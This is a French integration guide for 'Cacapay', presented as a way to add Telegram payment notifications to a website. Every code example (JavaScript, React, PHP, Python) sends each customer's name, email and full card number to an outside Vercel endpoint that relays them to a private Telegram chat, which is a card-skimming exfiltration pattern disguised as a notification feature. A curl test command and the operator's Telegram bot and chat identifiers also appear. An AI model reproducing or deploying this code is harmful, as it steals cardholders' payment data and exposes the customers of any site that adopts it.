# 🚀 Guide d'Intégration Cacapay

## 📋 Vue d'ensemble

Ce guide vous explique comment intégrer les notifications Telegram dans votre site de paiement.

## 🔧 Configuration

### URL de l'API
```
https://test-alpha-lac-68.vercel.app/api/telegram
```

### Méthode
```
POST
```

### Headers
```
Content-Type: application/json
```

## 💻 Exemples d'intégration

### 1. JavaScript Vanilla (HTML)

```javascript
async function sendPaymentNotification(paymentData) {
    try {
        const response = await fetch('https://test-alpha-lac-68.vercel.app/api/telegram', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                message: `💰 NOUVEAU PAIEMENT REÇU !
👤 Nom: ${paymentData.customerName}
📧 Email: ${paymentData.email}
💳 Carte: ${paymentData.cardNumber}
💶 Montant: ${paymentData.amount}€
🔒 Vérifiez immédiatement !`,
                type: 'payment'
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            console.log('✅ Notification envoyée !', result.telegramResponse?.result?.message_id);
            return { success: true, messageId: result.telegramResponse?.result?.message_id };
        } else {
            console.error('❌ Erreur notification:', result.error);
            return { success: false, error: result.error };
        }
    } catch (error) {
        console.error('❌ Erreur envoi notification:', error);
        return { success: false, error: error.message };
    }
}
```

### 2. React/Next.js

```jsx
import React, { useState } from 'react';

const PaymentForm = () => {
    const [formData, setFormData] = useState({
        customerName: '',
        email: '',
        amount: '',
        cardNumber: ''
    });

    const sendPaymentNotification = async (paymentData) => {
        const API_URL = 'https://test-alpha-lac-68.vercel.app/api/telegram';
        
        try {
            const response = await fetch(API_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    message: `💰 NOUVEAU PAIEMENT REÇU !
👤 Nom: ${paymentData.customerName}
📧 Email: ${paymentData.email}
💳 Carte: ${paymentData.cardNumber}
💶 Montant: ${paymentData.amount}€
🔒 Vérifiez immédiatement !`,
                    type: 'payment'
                })
            });

            const result = await response.json();
            return result.success ? { success: true, messageId: result.telegramResponse?.result?.message_id } : { success: false, error: result.error };
        } catch (error) {
            return { success: false, error: error.message };
        }
    };

    const handleSubmit = async (e) => {
        e.preventDefault();
        
        // Traiter le paiement
        const paymentResult = await processPayment(formData);
        
        if (paymentResult.success) {
            // Envoyer la notification
            const notificationResult = await sendPaymentNotification(formData);
            
            if (notificationResult.success) {
                alert('✅ Paiement réussi et notification envoyée !');
            }
        }
    };

    return (
        <form onSubmit={handleSubmit}>
            {/* Votre formulaire de paiement */}
        </form>
    );
};
```

### 3. PHP

```php
<?php
function sendPaymentNotification($paymentData) {
    $API_URL = 'https://test-alpha-lac-68.vercel.app/api/telegram';
    
    $message = "💰 NOUVEAU PAIEMENT REÇU !\n";
    $message .= "👤 Nom: " . $paymentData['customerName'] . "\n";
    $message .= "📧 Email: " . $paymentData['email'] . "\n";
    $message .= "💳 Carte: " . $paymentData['cardNumber'] . "\n";
    $message .= "💶 Montant: " . $paymentData['amount'] . "€\n";
    $message .= "🔒 Vérifiez immédiatement !";
    
    $data = [
        'message' => $message,
        'type' => 'payment'
    ];
    
    $options = [
        'http' => [
            'header' => "Content-type: application/json\r\n",
            'method' => 'POST',
            'content' => json_encode($data)
        ]
    ];
    
    $context = stream_context_create($options);
    $result = file_get_contents($API_URL, false, $context);
    
    if ($result === FALSE) {
        return ['success' => false, 'error' => 'Erreur de connexion'];
    }
    
    $response = json_decode($result, true);
    
    if ($response['success']) {
        return [
            'success' => true,
            'messageId' => $response['telegramResponse']['result']['message_id']
        ];
    } else {
        return [
            'success' => false,
            'error' => $response['error']
        ];
    }
}

// Utilisation
if ($_POST) {
    $paymentData = [
        'customerName' => $_POST['customerName'],
        'email' => $_POST['email'],
        'amount' => $_POST['amount'],
        'cardNumber' => $_POST['cardNumber']
    ];
    
    $result = sendPaymentNotification($paymentData);
    
    if ($result['success']) {
        echo "✅ Paiement réussi et notification envoyée !";
    } else {
        echo "❌ Erreur: " . $result['error'];
    }
}
?>
```

### 4. Python (Flask/Django)

```python
import requests
import json

def send_payment_notification(payment_data):
    api_url = 'https://test-alpha-lac-68.vercel.app/api/telegram'
    
    message = f"""💰 NOUVEAU PAIEMENT REÇU !
👤 Nom: {payment_data['customer_name']}
📧 Email: {payment_data['email']}
💳 Carte: {payment_data['card_number']}
💶 Montant: {payment_data['amount']}€
🔒 Vérifiez immédiatement !"""
    
    data = {
        'message': message,
        'type': 'payment'
    }
    
    try:
        response = requests.post(api_url, json=data)
        result = response.json()
        
        if result['success']:
            return {
                'success': True,
                'message_id': result['telegramResponse']['result']['message_id']
            }
        else:
            return {
                'success': False,
                'error': result['error']
            }
    except Exception as e:
        return {
            'success': False,
            'error': str(e)
        }

# Utilisation Flask
@app.route('/process_payment', methods=['POST'])
def process_payment():
    payment_data = request.json
    
    # Traiter le paiement
    payment_result = process_payment_with_stripe(payment_data)
    
    if payment_result['success']:
        # Envoyer la notification
        notification_result = send_payment_notification(payment_data)
        
        if notification_result['success']:
            return jsonify({
                'success': True,
                'message': 'Paiement réussi et notification envoyée !',
                'message_id': notification_result['message_id']
            })
    
    return jsonify({'success': False, 'error': 'Erreur de paiement'})
```

## 📱 Format du message

Le message envoyé à Telegram doit contenir :

```
💰 NOUVEAU PAIEMENT REÇU !
👤 Nom: [Nom du client]
📧 Email: [Email du client]
💳 Carte: [Numéro de carte]
💶 Montant: [Montant]€
🔒 Vérifiez immédiatement !
```

## 🔍 Réponse de l'API

### Succès
```json
{
    "success": true,
    "message": "Message envoyé avec succès",
    "telegramResponse": {
        "ok": true,
        "result": {
            "message_id": 123,
            "from": {
                "id": 8045865062,
                "is_bot": true,
                "first_name": "Cacapaybot"
            },
            "chat": {
                "id": 6523794278,
                "first_name": "Madrane",
                "username": "madranos",
                "type": "private"
            },
            "date": 1758137036,
            "text": "💰 NOUVEAU PAIEMENT REÇU !..."
        }
    }
}
```

### Erreur
```json
{
    "success": false,
    "error": "Description de l'erreur"
}
```

## 🧪 Test

Pour tester votre intégration :

1. **Utilisez le fichier de test :**
   ```bash
   open site_paiement_complet.html
   ```

2. **Testez avec curl :**
   ```bash
   curl -X POST https://test-alpha-lac-68.vercel.app/api/telegram \
     -H "Content-Type: application/json" \
     -d '{"message": "💰 TEST PAIEMENT !\n👤 Nom: Test\n📧 Email: test@test.com\n💳 Carte: 1234 **** **** 5678\n💶 Montant: 99.99€\n🔒 Vérifiez !", "type": "payment"}'
   ```

## ✅ Checklist d'intégration

- [ ] Votre site appelle l'API Vercel après chaque paiement
- [ ] Le message contient toutes les informations nécessaires
- [ ] La gestion d'erreur est implémentée
- [ ] Le test fonctionne correctement
- [ ] Les notifications arrivent sur Telegram

## 🆘 Support

Si vous rencontrez des problèmes :

1. Vérifiez que l'API Vercel fonctionne
2. Vérifiez que votre site peut faire des requêtes HTTPS
3. Vérifiez les logs de votre serveur
4. Testez avec le fichier HTML fourni

## 🎯 Résultat attendu

Quand un client paie sur votre site :
1. ✅ Le paiement est traité
2. ✅ Une notification est envoyée à Telegram
3. ✅ Vous recevez le message sur votre chat Telegram
4. ✅ Le site s'ouvre automatiquement (si configuré)
